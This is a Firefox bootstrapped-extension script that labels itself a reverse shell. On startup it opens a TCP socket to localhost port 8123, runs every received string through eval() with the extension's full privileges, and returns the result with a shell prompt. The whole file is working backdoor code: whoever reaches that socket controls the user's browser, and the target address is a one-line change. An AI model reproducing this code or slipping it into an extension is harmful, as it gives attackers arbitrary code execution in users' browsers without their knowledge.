Components.utils.import("resource://gre/modules/Services.jsm");

const { interfaces: Ci } = Components;
let socket;
let window;

function install() {
    console.log('Reverse shell install.');
}

function uninstall() {
    console.log('Reverse shell uninstall.');
}

function startup() {
    console.log('Reverse shell startup.');
    let windows = Services.wm.getEnumerator('navigator:browser');
    while (windows.hasMoreElements()) {
        let domWindow = windows.getNext().QueryInterface(Ci.nsIDOMWindow);
        if (window) {
            return;
        }
        window = domWindow;
        startSocket();
    }
    Services.wm.addListener(windowListener);
}

function shutdown() {
    console.log('Reverse shell shutdown.');
    if (socket) {
        socket.send('\nKTHXBAI!\n');
        socket.close();
    }
}

function startSocket() {
    socket = window.navigator.mozTCPSocket.open('localhost', 8123);
    socket.ondata = function (event) {
        let result;
        try {
            result = eval(event.data);
        } catch(e) {
            result = e;
        }
        socket.send(result + '\n>> ');
    }
    socket.onopen = function (event) {
        socket.send('OHAI! Here\'s your JS shell.\n>> ');
    }
}

let windowListener = {
    onOpenWindow: function(aWindow) {
        let domWindow = aWindow.QueryInterface(Ci.nsIInterfaceRequestor).getInterface(Ci.nsIDOMWindow);
        domWindow.addEventListener('load', function onLoad() {
            domWindow.removeEventListener('load', onLoad, false);
            if (window) {
                return;
            }
            window = domWindow;
            startSocket();
        }, false);
    },
};
